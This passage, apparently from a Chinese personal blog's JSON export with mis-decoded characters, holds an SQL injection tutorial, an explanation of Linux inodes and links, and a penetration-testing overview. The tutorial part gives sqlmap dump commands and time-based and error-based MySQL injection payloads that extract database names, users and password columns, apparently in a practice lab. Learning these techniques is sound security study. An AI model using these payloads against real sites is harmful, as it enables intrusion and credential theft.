åˆæ­¥æ£€æµ‹å¾—åˆ°DBMSä¸ºMySQLï¼Œä¸”åç«¯ç‰ˆæœ¬ä¸åœ¨5.0ç‰ˆæœ¬ä¹‹ä¸‹ï¼› çˆ†æ•°æ®åº“åpython sqlmap.py -u &quot;URL?id=1&quot; --dbs å¾—åˆ°å¦‚ä¸Š8ä¸ªæ•°æ®åº“ï¼› çˆ†è¡¨åpython sqlmap.py -u &quot;URL?id=1&quot; -D &quot;dbname&quot; --tablesä»¥â€œsecurityâ€ä¸ºä¾‹ï¼š å¾—åˆ°4 tablesï¼› çˆ†å­—æ®µpython sqlmap.py -u &quot;URL?id=1&quot; -D &quot;dbname&quot; -T &quot;table_name&quot; --columns å¾—åˆ°3 columnsï¼› çˆ†å†…å®¹python sqlmap.py -u &quot;URL?id=1&quot; -D &quot;dbname&quot; -T &quot;table_name&quot; -C &quot;id,username,password&quot; --dump å¾—åˆ°13 entriesï¼›+++ æ–¹æ³•3ï¼šæ—¶é—´å»¶è¿Ÿæ³¨å…¥(time-based blind)æ­£ç¡®å»¶è¿Ÿï¼Œé”™è¯¯ä¸å»¶æ—¶ï¼› çˆ†åº“ åº“é•¿ 1?id=1' and if(length(database())=8,sleep(5),1)--+ æ ¹æ®æµè§ˆå™¨åˆ·æ–°çš„å»¶è¿Ÿç¨‹åº¦ï¼Œå¯ä»¥åˆ¤æ–­åº“é•¿ä¸º8ï¼› åº“å 1?id=1' and if(left(database(),1)='s',sleep(5),1)--+ 1?id=1' and if(left(database(),2)='se',sleep(5),1)--+ çˆ†è¡¨ 1?id=1' and if( left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='e' ,sleep(5),1)-- ç¬¬ä¸€ä¸ªè¡¨é¦–å­—æ¯ä¸ºâ€™eâ€™; çˆ†å­—æ®µ 1?id=1' and if(mid((select column_name from information_schema.columns where table_name='users' limit 4,1),1,8)='password',sleep(5),1) --+ çˆ†å†…å®¹ 1?id=1' and if(substr((select password from users limit 0,1),1,1)='d',sleep(5),1) --+ â€¦â€¦ ç”±äºè¯¥æ–¹æ³•ä¸å¸ƒå°”æŠ¥é”™å‹ç›¸ä¼¼ï¼Œåªæ˜¯ç”¨æ¥è¡¨åæ­£ç¡®çš„æ–¹å¼ä¸åŒï¼Œå› æ­¤ä¸å†èµ˜è¿°ï¼› æ–¹æ³•4ï¼šæŠ¥é”™æ³¨å…¥(error-based)è¡¥å……ï¼š å¸¸ç”¨å‡½æ•° å‡½æ•°è¯­æ³• è§£é‡Š ç”¨æ³• CONCAT( string1, string2 ) CONCATå‡½æ•°è¿”å›string1è¿æ¥string2åçš„ä¸€ä¸ªå­—ç¬¦ä¸²å€¼ã€‚å¦‚æœæœ‰ä»»ä½•ä¸€ä¸ªå‚æ•°ä¸ºnullï¼Œåˆ™è¿”å›å€¼ä¸ºnullï¼› SELECT CONCAT(CONCAT(&#39;A&#39;, &#39;B&#39;),&#39;C&#39;) FROM dual;â€“ Result: â€˜ABCâ€™123456789101112131415| `FLOOR(x)` | è¿”å›å°äºç­‰äºè¾“å…¥çš„æ•°çš„æ•´æ•°; | `SELECT floor(3.1415926);`--Result: 3 || `RAND()` | äº§ç”Ÿ0å’Œ1ä¹‹é—´çš„ä¸€ä¸ªéšæœºæ•°ï¼› | `RAND();`--Result: 0.1824410643265 || `COUNT(expression)` | ç”¨äºæ£€ç´¢è¡¨è¾¾å¼æˆ–ç»™å®šåˆ—çš„è¡Œæ•°; | `SELECT COUNT(aggregate_expression) FROM tables [WHERE conditions];` || `GROUP BY` | åä½œ SELECTè¯­å¥ç›¸åŒçš„æ•°æ®æˆç»„ä»¥ä¾¿å®‰æ’; | `SELECT column-list FROM table_name WHERE [ conditions ] GROUP BY column1, column2....columnN ORDER BY column1, column2....columnN` |+++**ä½¿ç”¨èšåˆå‡½æ•°è¿›è¡ŒåŒæ³¨å…¥æŸ¥è¯¢æ—¶ï¼Œä¼šåœ¨é”™è¯¯ä¿¡æ¯ä¸­æ˜¾ç¤ºä¸€éƒ¨åˆ†é”™è¯¯ä¿¡æ¯ã€‚**æ„é€ åŒæŸ¥è¯¢ï¼Œæ¯”å¦‚æ´¾ç”Ÿè¡¨ï¼Œä½¿ä¸€ä¸ªæŠ¥é”™ï¼Œå¦ä¸€ä¸ªçš„ç»“æœå°±ä¼šå‡ºç°åœ¨æŠ¥é”™çš„ä¿¡æ¯ä¸­ã€‚1. æŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯```sql?id=-1&apos;union select count(*),count(*), concat(&apos;~&apos;,(select version()),&apos;~&apos;,floor(rand()*2)) as a from information_schema.tables group by a --+ æ³¨ï¼šåŠ å…¥â€™~â€™æ˜¯ä¸ºäº†æ˜æ˜¾åŒºåˆ†æŸ¥è¯¢å†…å®¹ï¼Œé˜²æ­¢åŠ å…¥å…¶ä»–è¿æ¥è¿›çš„å­—ç¬¦ä¸²ï¼› çˆ†åº“ 1?id=-1'union select count(*),count(*), concat('~',(select database()),'~',floor(rand()*2)) as a from information_schema.tables group by a --+ çˆ†ç”¨æˆ· 1?id=-1' union select count(*),count(*), concat('~',(select user()),'~', floor(rand()*2)) as a from information_schema.tables group by a--+ çˆ†è¡¨ 1?id=-1' union select count(*),1, concat('~',(select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),'~',floor(rand()*2)) as a from information_schema.tables group by a--+ é€šè¿‡ä¿®æ”¹limit x,1 éå†è¡¨å; çˆ†å­—æ®µ 1?id=-1' union select count(*),count(*), concat('~',(select column_name from information_schema.columns where table_name='users' limit 1,1),'~',floor(rand()*2)) as a from information_schema.tables group by a--+ çˆ†å†…å®¹ 1?id=-1' union select count(*),count(*), concat('~',(select concat_ws(':',password,username) from users limit 1,1),'~',floor(rand()*2)) as a from information_schema.tables group by a--+ ä¿®æ”¹limit x,1 ä»¥æ›´æ”¹çˆ†å‡ºç¬¬xä¸ªç”¨æˆ·çš„passwordå’Œusername ï¼ˆâ€˜[â€™æ˜¯åˆ†éš”ç¬¦ï¼‰ï¼› æ³¨ï¼š concat() è¿æ¥å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œåªè¦å…¶ä¸­ä¸€ä¸ªæ˜¯NULLï¼Œé‚£ä¹ˆå°†è¿”å›NULL concat_ws() è¿æ¥å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œåªè¦æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²ä¸æ˜¯NULLï¼Œå°±ä¸ä¼šè¿”å›NULLã€‚(concat_wså‡½æ•°éœ€è¦æŒ‡å®šåˆ†éš”ç¬¦) END","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://singlemindedt.github.io/tags/SQL/"}]},{"title":"Linux çš„èŠ‚ç‚¹ inode","slug":"2020-03-11-Linux-çš„èŠ‚ç‚¹-inode","date":"2020-03-11T11:29:23.000Z","updated":"2020-03-12T09:21:51.677Z","comments":true,"path":"2020/03/11/2020-03-11-Linux-çš„èŠ‚ç‚¹-inode/","link":"","permalink":"https://singlemindedt.github.io/2020/03/11/2020-03-11-Linux-çš„èŠ‚ç‚¹-inode/","excerpt":"","text":"WHO?æ–‡ä»¶æ•°æ®å‚¨å­˜åœ¨ç¡¬ç›˜ä¸­ï¼Œç¡¬ç›˜æœ€å°çš„å‚¨å­˜å•å…ƒä¸ºâ€œæ‰‡åŒºâ€ï¼ˆä¸€ä¸ªæ‰‡åŒº512å­—èŠ‚ï¼‰ã€‚æ“ä½œç³»ç»Ÿè¯»å–ç¡¬ç›˜æ—¶ï¼Œä¸ºæé«˜è¯»å–æ•ˆç‡ï¼Œä¸€æ¬¡æ€§è¯»å–å¤šä¸ªæ‰‡åŒºï¼Œè¿™äº›æ‰‡åŒºç»„æˆâ€œå—â€(å³blockï¼Œæ˜¯æ–‡ä»¶å­˜å–çš„æœ€å°å•ä½ï¼Œä¸€èˆ¬ä¸º4KBï¼Œå³è¿ç»­8ä¸ªæ‰‡åŒºç»„æˆä¸€ä¸ªblockï¼›)æ–‡ä»¶éƒ½å‚¨å­˜åœ¨â€œå—â€ä¸­ï¼Œé‚£ä¹ˆè¿˜å¿…é¡»æ‰¾åˆ°ä¸€ä¸ªåœ°æ–¹å‚¨å­˜æ–‡ä»¶çš„å…ƒä¿¡æ¯ï¼Œæ¯”å¦‚æ–‡ä»¶çš„åˆ›å»ºè€…ã€æ–‡ä»¶çš„åˆ›å»ºæ—¥æœŸã€æ–‡ä»¶çš„å¤§å°ç­‰ç­‰ã€‚è¿™ç§å‚¨å­˜æ–‡ä»¶å…ƒä¿¡æ¯çš„åŒºåŸŸå°±å«åšinodeï¼Œä¸­æ–‡è¯‘åä¸ºâ€ç´¢å¼•èŠ‚ç‚¹â€ã€‚æ¯ä¸€ä¸ªæ–‡ä»¶éƒ½æœ‰å¯¹åº”çš„inodeï¼Œé‡Œé¢åŒ…å«äº†ä¸è¯¥æ–‡ä»¶æœ‰å…³çš„ä¸€äº›ä¿¡æ¯ã€‚æ¯ä¸ªå­˜å‚¨è®¾å¤‡(å¦‚ç¡¬ç›˜)æˆ–å­˜å‚¨è®¾å¤‡çš„åˆ†åŒºè¢«æ ¼å¼åŒ–ä¸ºæ–‡ä»¶ç³»ç»Ÿåï¼Œæœ‰ä¸¤éƒ¨åˆ†å†…å®¹ï¼Œä¸€éƒ¨åˆ†ä¸ºinodeï¼Œå¦ä¸€éƒ¨åˆ†ä¸ºblockã€‚blockç”¨æ¥å­˜å‚¨æ•°æ®ï¼Œinodeç”¨æ¥å­˜å‚¨æ•°æ®çš„ä¿¡æ¯(å¦‚æ–‡ä»¶å¤§å°ã€å±æ€§ã€å½’å±çš„ç”¨æˆ·ç»„ã€è¯»å†™æƒé™ç­‰)ã€‚inodeä¸ºæ¯ä¸ªæ–‡ä»¶è¿›è¡Œä¿¡æ¯ç´¢å¼•ï¼Œå› æ­¤æœ‰äº†inodeçš„æ•°å€¼ã€‚æ“ä½œç³»ç»Ÿæ ¹æ®æŒ‡ä»¤ï¼Œèƒ½é€šè¿‡inodeå€¼æ‰¾åˆ°ç›¸å¯¹åº”çš„æ–‡ä»¶ã€‚ Inodeå†…å®¹ æ–‡ä»¶çš„å­—èŠ‚æ•° æ–‡ä»¶æ‹¥æœ‰è€…çš„User ID æ–‡ä»¶çš„Group ID æ–‡ä»¶çš„è¯»ã€å†™ã€æ‰§è¡Œæƒé™ æ–‡ä»¶çš„æ—¶é—´æˆ³ï¼Œå…±æœ‰ä¸‰ä¸ªï¼šctimeæŒ‡inodeä¸Šä¸€æ¬¡å˜åŠ¨çš„æ—¶é—´ï¼ŒmtimeæŒ‡æ–‡ä»¶å†…å®¹ä¸Šä¸€æ¬¡å˜åŠ¨çš„æ—¶é—´ï¼ŒatimeæŒ‡æ–‡ä»¶ä¸Šä¸€æ¬¡æ‰“å¼€çš„æ—¶é—´ã€‚ é“¾æ¥æ•°ï¼Œå³æœ‰å¤šå°‘æ–‡ä»¶åæŒ‡å‘è¿™ä¸ªinode æ–‡ä»¶æ•°æ®blockçš„ä½ç½®ä½¿ç”¨stat æ–‡ä»¶åå‘½ä»¤ï¼Œå¯ä»¥æŸ¥çœ‹æ–‡ä»¶çš„inodeä¿¡æ¯ï¼š è¿™æ˜¯ä¸€ä¸ªæ–°å»ºçš„ç©ºçš„txtæ–‡æœ¬æ–‡ä»¶ï¼› Inodeå¤§å°ä¸æ•°é‡inodeä¹Ÿä¼šæ¶ˆè€—ç¡¬ç›˜ç©ºé—´ï¼Œæ‰€ä»¥ç¡¬ç›˜æ ¼å¼åŒ–çš„æ—¶å€™ï¼Œæ“ä½œç³»ç»Ÿè‡ªåŠ¨å°†ç¡¬ç›˜åˆ†æˆä¸¤ä¸ªåŒºåŸŸï¼šä¸€ä¸ªæ˜¯æ•°æ®åŒºï¼ˆdata areaï¼‰ï¼Œå­˜æ”¾blockï¼›å¦ä¸€ä¸ªæ˜¯inodeåŒºï¼ˆä¹Ÿäº¤inodeè¡¨ï¼Œinode tableï¼‰ï¼Œå­˜æ”¾inodeã€‚inodeèŠ‚ç‚¹çš„å¤§å°ï¼Œä¸€èˆ¬ä¸º128Bæˆ–256Bã€‚inodeèŠ‚ç‚¹çš„æ•°ç›®ï¼Œåœ¨æ ¼å¼åŒ–æ—¶å°±ç»™å®šï¼Œä¸€èˆ¬æ˜¯æ¯1KBæˆ–æ¯2KBå°±è®¾ç½®ä¸€ä¸ªinodeã€‚å‡å®šåœ¨ä¸€å—1GBçš„ç¡¬ç›˜ä¸­ï¼Œæ¯ä¸ªinodeèŠ‚ç‚¹çš„å¤§å°ä¸º128å­—èŠ‚ï¼Œæ¯1KBå°±è®¾ç½®ä¸€ä¸ªinodeï¼Œé‚£ä¹ˆinode tableçš„å¤§å°å°±ä¼šè¾¾åˆ°128MBï¼Œå æ•´å—ç¡¬ç›˜çš„12.8%ã€‚ä½¿ç”¨df -iå¯ä»¥æŸ¥çœ‹æ¯ä¸ªç¡¬ç›˜åˆ†åŒºçš„inodeæ€»æ•°å’Œå·²ç»ä½¿ç”¨çš„æ•°é‡ï¼š æ³¨ï¼šç”±äºinodeæ˜¯æœ‰é™ä¸ªçš„ï¼Œè€Œæ¯ä¸ªæ–‡ä»¶åˆæœ‰ä¸€ä¸ªinodeï¼Œå› æ­¤äº§ç”Ÿç°è±¡ï¼šç¡¬ç›˜è¿˜æœªå­˜æ»¡ï¼Œä½†inodeèŠ‚ç‚¹å·²ç»ç”¨å…‰ï¼Œå¯¼è‡´ç¡¬ç›˜ä¸Šæ— æ³•åˆ›å»ºæ–°æ–‡ä»¶ã€‚æŸ¥çœ‹æ¯ä¸ªinodeèŠ‚ç‚¹å¤§å°ï¼Œå¯ä»¥ä½¿ç”¨sudo dumpe2fs -h /dev/hda | grep &quot;Inode size&quot; Inode numberæ¯ä¸ªinodeéƒ½æœ‰ä¸€ä¸ªå·ï¼Œç±»ä¼¼èº«ä»½è¯å·ï¼ŒUnix/Linuxæ“ä½œç³»ç»Ÿå†…éƒ¨ä¸ä½¿ç”¨æ–‡ä»¶åï¼Œè€Œæ˜¯ç”¨inode numberæ¥è¯†åˆ«æ–‡ä»¶ã€‚æ–‡ä»¶ååªæ˜¯inode numberä¾¿äºè¯†åˆ«çš„åˆ«ç§°æˆ–ç»°å·ã€‚è¡¨é¢ä¸Šï¼Œç”¨æˆ·é€šè¿‡æ–‡ä»¶åæ‰“å¼€æ–‡ä»¶ï¼›å®é™…ä¸Šï¼Œç³»ç»Ÿå†…éƒ¨åˆ†ä¸‰æ­¥å®Œæˆè¿™ä¸€è¿‡ç¨‹ï¼š æ‰¾åˆ°æ–‡ä»¶åå¯¹åº”çš„inode numberï¼ˆå†…å­˜ï¼‰ã€‚ é€šè¿‡inode numberï¼Œè·å–inodeå†…å®¹ï¼ˆç£ç›˜ï¼‰ã€‚ æœ€åï¼Œæ ¹æ®inodeå†…å®¹ï¼Œæ‰¾åˆ°æ–‡ä»¶æ•°æ®å­˜å‚¨çš„æ‰€æœ‰blockï¼Œè¯»å‡ºæ•°æ®ï¼ˆç£ç›˜ï¼‰ã€‚ä½¿ç”¨ls -iå‘½ä»¤ï¼Œå¯ä»¥çœ‹åˆ°æ–‡ä»¶åå¯¹åº”çš„inode numberï¼š ç›®å½•æ–‡ä»¶** Linuxç³»ç»Ÿä¸­ï¼Œä¸€åˆ‡çš†æ–‡ä»¶ã€‚**Linuxç³»ç»Ÿä¸­ï¼Œç›®å½•ï¼ˆdirectoryï¼‰ä¹Ÿæ˜¯ä¸€ç§æ–‡ä»¶ã€‚æ‰“å¼€ç›®å½•ï¼Œå®é™…ä¸Šå°±æ˜¯æ‰“å¼€ç›®å½•æ–‡ä»¶ã€‚ç›®å½•æ–‡ä»¶çš„ç»“æ„éå¸¸ç®€å•ï¼Œå°±æ˜¯ä¸€ç³»åˆ—ç›®å½•é¡¹ï¼ˆdirentï¼‰çš„åˆ—è¡¨ã€‚æ¯ä¸ªç›®å½•é¡¹ï¼Œç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼šæ‰€å«æ–‡ä»¶çš„æ–‡ä»¶åï¼Œä»¥åŠè¯¥æ–‡ä»¶åå¯¹åº”çš„inode numberã€‚lsåˆ—å‡ºç›®å½•æ–‡ä»¶ä¸­çš„æ‰€æœ‰æ–‡ä»¶åï¼š ls -iåˆ—å‡ºæ•´ä¸ªç›®å½•æ–‡ä»¶ï¼ŒåŒ…æ‹¬æ–‡ä»¶åå¯¹åº”çš„inode numberï¼› ls -lå¯æŸ¥çœ‹æ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯(å³æ ¹æ®inode numberï¼Œè®¿é—®inodeèŠ‚ç‚¹)ï¼š æ ¹æ®ä»¥ä¸Šå†…å®¹å¯¹ç›®å½•æƒé™çš„ç†è§£åº”æœ‰ä»¥ä¸‹ï¼š ç›®å½•æ–‡ä»¶çš„è¯»æƒé™(r)å’Œå†™æƒé™(w)é’ˆå¯¹ç›®å½•æ–‡ä»¶æœ¬èº«ï¼› è€Œç›®å½•æ–‡ä»¶ä¸­åªæœ‰æ–‡ä»¶åå’Œinode numberï¼Œè‹¥æ˜¯æƒ³å¾—åˆ°æ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯ï¼Œå°±å¿…é¡»ç»è¿‡inodeèŠ‚ç‚¹ï¼Œå½“åªæœ‰è¯»æƒé™æ—¶ï¼Œç”¨æˆ·ä»…èƒ½å¾—åˆ°æ–‡ä»¶åç­‰åŸºæœ¬ä¿¡æ¯ï¼Œè€Œè¯»å–inodeç´¢å¼•èŠ‚ç‚¹å†…çš„ä¿¡æ¯éœ€è¦ç”¨æˆ·æ‹¥æœ‰ç›®å½•æ–‡ä»¶çš„æ‰§è¡Œæƒé™(x)ã€‚ ç¡¬é“¾æ¥ä¸€èˆ¬æƒ…å†µï¼Œæ–‡ä»¶åå’Œinode numberæ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œæ¯ä¸ªinode numberå¯¹åº”ä¸€ä¸ªæ–‡ä»¶åã€‚ä½†æ˜¯ï¼ŒUnix/Linuxç³»ç»Ÿå…è®¸å¤šä¸ªæ–‡ä»¶åæŒ‡å‘åŒä¸€ä¸ªinode numberã€‚é‚£ä¹ˆå°±ä¼šäº§ç”Ÿå¯ä»¥é€šè¿‡ä¸åŒæ–‡ä»¶åæ¥è®¿é—®ç›¸åŒæ–‡ä»¶ï¼›å¯¹æ–‡ä»¶å†…å®¹ä¿®æ”¹ä¼šå½±å“æ‰€ç”¨ç›¸åŒinode numberæŒ‡å‘çš„æ–‡ä»¶åï¼›åˆ é™¤å…¶ä¸­ä¸€ä¸ªæ–‡ä»¶åä¸å½±å“å…¶ä»–æ–‡ä»¶åå¯¹æ–‡ä»¶çš„è®¿é—®çš„æƒ…å†µã€‚å³ç§°ä¸ºâ€œç¡¬é“¾æ¥â€ã€‚ ln æºæ–‡ä»¶ ç›®æ ‡æ–‡ä»¶å‘½ä»¤åˆ›å»ºç¡¬é“¾æ¥ï¼š[8]:() é¦–åˆ—æ˜¯inode numberï¼Œç¬¬3åˆ—è¡¨ç¤ºæŒ‡å‘è¯¥inodeèŠ‚ç‚¹çš„æ–‡ä»¶åçš„æ•°é‡ï¼Œå³é“¾æ¥æ•°ã€‚å¯ä»¥çœ‹åˆ°åœ¨åˆ›å»ºä¹‹å‰åªç”¨ä¸¤ä¸ªæ–‡ä»¶test0.txtå’Œtimg.jpegï¼Œå¹¶ä¸”å®ƒä»¬çš„é“¾æ¥æ•°é‡å‡ä¸º1ï¼›åˆ›å»ºåï¼Œå¤šå‡ºæ–‡ä»¶test1.txt,ä¸”test0.txtå’Œ test1.txtçš„inode numberå‡ä¸º4458874ï¼Œé“¾æ¥æ•°é‡ä¹Ÿæ˜¾ç¤ºä¸º2ã€‚æ³¨ï¼šåˆ›å»ºç›®å½•æ—¶ï¼Œé»˜è®¤ä¼šç”Ÿæˆä¸¤ä¸ªç›®å½•é¡¹ï¼šâ€.â€å’Œâ€..â€ã€‚â€œ.â€çš„inode numberå³ä¸ºå½“å‰ç›®å½•çš„inode numberï¼Œç›¸å½“äºå½“å‰ç›®å½•çš„ä¸€ä¸ªç¡¬é“¾æ¥ï¼›â€œ..â€çš„inode numberå³ä¸ºå½“å‰ç›®å½•çš„çˆ¶ç›®å½•çš„inode numberï¼Œç›¸å½“äºçˆ¶ç›®å½•çš„ä¸€ä¸ªç¡¬é“¾æ¥ã€‚æ•…ä»»ä½•ä¸€ä¸ªç›®å½•çš„ç¡¬é“¾æ¥æ€»æ•°ï¼Œæ€»æ˜¯ç­‰äº2åŠ ä¸Šå®ƒçš„å­ç›®å½•æ€»æ•°ï¼ˆå«éšè—ç›®å½•ï¼‰ã€‚ è½¯è¿æ¥è½¯é“¾ï¼ˆsoft linkï¼Œæˆ–ç§°ç¬¦å·é“¾æ¥symbolic linkï¼‰æŒ‡ï¼Œå¦‚æœæ–‡ä»¶Aè½¯é“¾æŒ‡å‘æ–‡ä»¶Bï¼Œåˆ™æ ‡è®°æ–‡ä»¶Aä¸ºè½¯é“¾æ–‡ä»¶ï¼Œå¹¶åœ¨æ–‡ä»¶Aä¸­è®°å½•æ–‡ä»¶Bçš„è·¯å¾„ã€‚æ­¤æ—¶ï¼Œæ–‡ä»¶Aä¸æ–‡ä»¶Bçš„inode numberå·ç ä¸åŒã€‚ç³»ç»Ÿè¯»å–æ–‡ä»¶Aæ—¶ï¼Œæ ¹æ®Aæ˜¯è½¯è¿æ¥ä¼šè‡ªåŠ¨å°†è®¿é—®è€…å¯¼å‘æ–‡ä»¶Bï¼Œå³æœ€ç»ˆå‡è®¿é—®Bã€‚ç›¸äº¤å¯¹äºè¯»ã€ä¿®æ”¹æ“ä½œï¼Œç¡¬é“¾æ¥ä¸è½¯è¿æ¥å®ç°çš„æ•ˆæœç›¸åŒã€‚ä½†åˆ é™¤ï¼ˆåŒ…æ‹¬renameï¼‰æ“ä½œä¸Šè¡¨ç°ä¸åŒï¼š å¦‚æœåˆ é™¤æ–‡ä»¶Aï¼Œåˆ™æ–‡ä»¶Bæ— å½±å“ï¼› å¦‚æœåˆ é™¤æ–‡ä»¶Bï¼Œåˆ™æ–‡ä»¶Aä¾ç„¶å­˜åœ¨ï¼Œä½†è®¿é—®æ–‡ä»¶Aæ—¶ä¼šæŠ¥é”™ï¼›ln -s æºæ–‡ä»¶ ç›®æ ‡æ–‡ä»¶åˆ›å»ºè½¯é“¾æ¥ï¼š å¯ä»¥çœ‹åˆ°ç¬¬4è¡Œä¸­test2.txté«˜äº®å¹¶æœ‰ç®­å¤´æŒ‡å‘test1.txtã€‚è½¯é“¾æ¥test2.txtå’Œæºæ–‡ä»¶test1.txtæ‰€æ‹¥æœ‰çš„inode numberä¸ä¸€æ ·ï¼Œå³è½¯é“¾æ¥æ˜¯æ–°å»ºäº†ä¸€ä¸ªæ–‡ä»¶ï¼Œè€Œè¯¥æ–‡ä»¶æŒ‡å‘æºæ–‡ä»¶ï¼Œå¹¶éæºinode èŠ‚ç‚¹ã€‚ å‚è€ƒæ–‡çŒ®:1.Linuxå…¬ç¤¾2.Blog03.Blog14.ç™¾ç§‘5.Blog2","categories":[],"tags":[]},{"title":"æ¸—é€æµ‹è¯•åŸºç¡€","slug":"2020-03-03-æ¸—é€æµ‹è¯•åŸºç¡€","date":"2020-03-03T02:15:57.000Z","updated":"2020-08-01T08:50:15.380Z","comments":true,"path":"2020/03/03/2020-03-03-æ¸—é€æµ‹è¯•åŸºç¡€/","link":"","permalink":"https://singlemindedt.github.io/2020/03/03/2020-03-03-æ¸—é€æµ‹è¯•åŸºç¡€/","excerpt":"","text":"+++æ¸—é€æµ‹è¯•æ˜¯å¯¹ç½‘ç«™å’ŒæœåŠ¡å™¨çš„å…¨æ–¹ä½å®‰å…¨æµ‹è¯•ï¼Œé€šè¿‡æ¨¡æ‹Ÿé»‘å®¢æ”»å‡»çš„æ‰‹æ³•ï¼Œåˆ‡è¿‘å®æˆ˜ï¼Œæå‰æ£€æŸ¥ç½‘ç«™çš„æ¼æ´ï¼Œç„¶åè¿›è¡Œè¯„ä¼°å½¢æˆå®‰å…¨æŠ¥å‘Šã€‚ +++ å‰æœŸäº¤äº’é˜¶æ®µ(ç¡®å®šæ¸—é€æµ‹è¯•çš„èŒƒå›´å’Œç›®æ ‡) +++ æƒ…æŠ¥æœé›†é˜¶æ®µ40%-60%all time ç›®æ ‡é€‰æ‹© éšç§æ”¶é›† è¸©ç‚¹å·¥ä½œ éªŒè¯ç›®æ ‡çš„å®‰å…¨æœºåˆ¶ +++ å¨èƒå»ºæ¨¡é˜¶æ®µ(åˆ†æï¼Œç¡®å®šæœ€ä½³æ”»å‡»æ–¹å¼ï¼Œç¡®å®šå®‰å…¨å¨èƒ) +++ æ¼æ´åˆ†æé˜¶æ®µ ä¸‰ç§æœºåˆ¶ï¼šæµ‹è¯•ã€éªŒè¯ã€ç ”ç©¶ï¼› +++ æ¸—é€æ”»å‡»é˜¶æ®µ å¯ä»¥åˆ©ç”¨ä»¥å‰æ¼æ´åˆ†æé˜¶æ®µçš„æˆæœï¼Œæ˜¯çœŸæ­£çš„æ”»å‡»é˜¶æ®µ; +++ åæ¸—é€æ”»å‡»é˜¶æ®µ(å®¢æˆ·å…³å¿ƒçš„ä»·å€¼) åŒ…æ‹¬äº†å½“æˆåŠŸæ¸—é€æ”»å‡»åˆ°å¯¹æ–¹è®¡ç®—æœºä»¥åçš„å¾ˆå¤šä»»åŠ¡ï¼Œæ¯”å¦‚ææƒã€ä¸Šä¼ å’Œä¸‹è½½æ–‡ä»¶ã€è·³æ¿æ”»å‡»ç­‰ ä»¥ç‰¹å®šçš„ä¸šåŠ¡ç³»ç»Ÿä¸ºç›®æ ‡ï¼Œè¯†åˆ«å‡ºå…³é”®åŸºç¡€è®¾æ–½ï¼Œå¹¶å¯»æ‰¾å®¢æˆ·æœ€æœ‰ä»·å€¼çš„èµ„äº§ +++ æŠ¥å‘Šé˜¶æ®µ ç¡®å®šç›®æ ‡æœ€ä¸ºé‡è¦çš„å¨èƒ å°†æ¸—é€æµ‹è¯•å¾—åˆ°çš„æ•°æ®ç”Ÿæˆè¡¨æ ¼å’Œå›¾è¡¨ å¯¹ç›®æ ‡ç³»ç»Ÿçš„æ”¹è¿›å»ºè®® å¯¹é—®é¢˜çš„ä¿®å¤æ–¹æ¡ˆ æŠ¥å‘Šä¸¾ä¾‹ï¼šoffensive-security +++ æŸå…¬å¸å®‰å…¨æ¸—é€ä»‹ç»ï¼š æ¸—é€æµ‹è¯•èŒƒå›´å’Œå†…å®¹ ç½‘ç«™å®‰å…¨æ¸—é€åŒ…æ‹¬ï¼ŒSQLæ³¨å°„æ¼æ´ï¼Œcookiesæ³¨å…¥æ¼æ´ï¼Œæ–‡ä»¶ä¸Šä¼ æˆªæ–­æ¼æ´ï¼Œç›®å½•éå†æ¼æ´ï¼ŒURLè·³è½¬æ¼æ´ï¼Œåœ¨çº¿ç¼–è¾‘å™¨æ¼æ´ï¼Œç½‘ç«™èº«ä»½éªŒè¯è¿‡æ»¤æ¼æ´ï¼ŒPHPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œæ•°æ®åº“æš´åº“æ¼æ´ï¼Œç½‘ç«™è·¯å¾„æ¼æ´ï¼ŒXSSè·¨ç«™æ¼æ´ï¼Œé»˜è®¤åå°åŠå¼±å£ä»¤æ¼æ´ï¼Œä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œç½‘ç«™ä»£ç è¿œç¨‹æº¢å‡ºæ¼æ´ï¼Œä¿®æ”¹ä»»æ„è´¦å·å¯†ç æ¼æ´ï¼Œç¨‹åºåŠŸèƒ½ä¸Šçš„é€»è¾‘æ¼æ´ï¼Œä»»æ„æ¬¡æ•°çŸ­ä¿¡å‘é€ã€ä»»æ„æ‰‹æœºå·ç æˆ–é‚®ç®±æ³¨å†Œæ¼æ´åå°æˆ–è€…apiæ¥å£å®‰å…¨è®¤è¯ç»•è¿‡æ¼æ´ç­‰ç­‰çš„å®‰å…¨æ¸—é€æµ‹è¯•ã€‚ æœåŠ¡å™¨å®‰å…¨æ¸—é€åŒ…æ‹¬ï¼Œå†…ç½‘æ¸—é€ï¼ŒFTPææƒæ¼æ´ï¼ŒSQL Serveræ•°æ®åº“ææƒï¼ŒMysqlææƒæ¼æ´ï¼Œlinuxæœ¬åœ°æº¢å‡ºæ¼æ´ï¼Œæ›¿æ¢ç³»ç»ŸæœåŠ¡æ¼æ´ï¼Œè¿œç¨‹æ¡Œé¢è®¤è¯ç»•è¿‡æ¼æ´ï¼Œç«¯å£æ˜ å°„æ¼æ´ï¼ŒCCå‹åŠ›æµ‹è¯•ï¼ŒDDOSå‹åŠ›æµ‹è¯•ï¼Œarpæ¬ºéª—ç¯¡æ”¹é¡µé¢æµ‹è¯•ï¼ŒDNSæ¬ºéª—æ¼æ´ï¼Œä¼šè¯åŠ«æŒæ¼æ´ï¼Œä»¥åŠè™šæ‹Ÿä¸»æœºç­‰ä¼—å¤šåº”ç”¨ç¨‹åºç³»ç»Ÿçš„æ¼æ´æµ‹è¯•ã€‚ SQLæ³¨å…¥: æ£€æµ‹ç½‘ç«™æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œå¦‚ï¼šINTå‹æ³¨å…¥å’ŒStringå‹æ³¨å…¥ï¼Œç›²æ³¨ã€æŠ¥é”™æ³¨å…¥ã€ç¼–ç 